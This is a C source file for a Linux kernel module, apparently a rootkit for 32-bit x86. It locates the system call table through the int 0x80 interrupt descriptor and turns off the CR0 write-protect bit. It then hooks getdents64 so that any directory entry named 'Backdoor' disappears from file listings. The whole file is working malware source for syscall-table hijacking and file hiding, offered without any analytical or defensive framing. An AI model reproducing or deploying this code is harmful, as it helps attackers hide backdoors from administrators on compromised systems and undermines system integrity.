#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/unistd.h>

MODULE_LICENSE("Dual BSD/GPL");

#define MAX_SEARCH_OFFSET 100

char target_file[10] = "Backdoor";

typedef unsigned long ADDR;
typedef unsigned char byte;

struct {
    unsigned short limit;
    unsigned int base;
} __attribute__((packed)) idtr;

typedef struct {
    unsigned short offset1;
    unsigned short selector;
    byte reserved;
    byte flag;
    unsigned short offset2;
} __attribute__((packed)) IDT_ENTRY;

IDT_ENTRY idt;
ADDR syscall_table_addr;

ADDR get_syscall_table_address(ADDR int80_start_addr) {
    byte * p = (byte *)int80_start_addr;
    for (; p < (byte *)(int80_start_addr + MAX_SEARCH_OFFSET); p += 1) {
        /* printk(KERN_INFO "0x%08x: 0x%02x 0x%02x 0x%02x\n", p, *(p+0), *(p+1), *(p+2)); */
        if (*p == 0xff && *(p+1) == 0x14 && *(p+2) == 0x85) {
            return (ADDR)*((ADDR *)(p + 3));
        }
    }
    return (ADDR)NULL;
}

asmlinkage long (*original_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

asmlinkage long my_sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long nread = (*original_sys_getdents64)(fd, dirent, count);
    int bpos;
    struct linux_dirent64 * d;

    /* printk(KERN_INFO "nread: %d\n", nread); */

    if (nread <= 0) {
        return nread;
    }

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent64 *) ((byte *)dirent + bpos);
        printk(KERN_INFO "try: %s\n", d->d_name);
        if (strcmp(d->d_name, target_file) == 0) {
            printk(KERN_INFO "found %s and filte out\n", target_file);
            nread -= d->d_reclen;
            memmove(d, (byte*)d + d->d_reclen, nread - bpos);
        } else {
            bpos += d->d_reclen;
        }
    }
    return nread;
}

unsigned int get_wp_bit(void) {
    unsigned int cr0;
    unsigned int wp_bit;

    asm volatile("movl %%cr0, %%eax" : "=r"(cr0));
    wp_bit = ( cr0 & (1 << 16) ) >> 16;

    return wp_bit;
}

void set_wp_bit(unsigned int wp_bit) {
    unsigned int cr0;
    
    asm volatile("movl %%cr0, %%eax" : "=r"(cr0));

    asm volatile("movl %%eax, %%cr0" : : "a"((cr0 & (~(1 << 16))) | (wp_bit << 16)));

    return ;
}

static int hook_getdents64(void) {
    ADDR int80_start_addr;
    unsigned int wp_bit;

    printk(KERN_INFO "===================================\n");
    
    asm("sidt %0":"=m"(idtr));
    printk(KERN_INFO "IDTR: 0x%08x , 0x%08x\n", idtr.limit, idtr.base);

    idt = *((IDT_ENTRY *)(idtr.base + 0x80 * 8));
    printk(KERN_INFO "IDT: 0x%08x , 0x%08x , 0x%08x , 0x%08x , 0x%08x\n", idt.offset1, idt.selector, idt.reserved, idt.flag, idt.offset2);

    int80_start_addr = idt.offset2 << 16 | idt.offset1;

    printk(KERN_INFO "INT80 ADDR: 0x%08x\n", (unsigned int)int80_start_addr);

    syscall_table_addr = get_syscall_table_address(int80_start_addr);
    printk(KERN_INFO "Syscall table: 0x%x\n", (unsigned int)syscall_table_addr);

    original_sys_getdents64 = ((void **)syscall_table_addr)[__NR_getdents64];

    wp_bit = get_wp_bit();    
    set_wp_bit(0);

    ((void **)syscall_table_addr)[__NR_getdents64] = my_sys_getdents64;

    set_wp_bit(wp_bit);

    printk(KERN_INFO "Successfully hooked getdents64\n");
    printk(KERN_INFO "===================================\n");
    return 0;
}

static void unhook_getdents64(void) {
    unsigned int wp_bit;
    wp_bit = get_wp_bit();    
    set_wp_bit(0);

    ((void **)syscall_table_addr)[__NR_getdents64] = original_sys_getdents64;

    set_wp_bit(wp_bit);
    printk(KERN_INFO "Successfully unhooked getdents64\n");
}

module_init(hook_getdents64);
module_exit(unhook_getdents64);
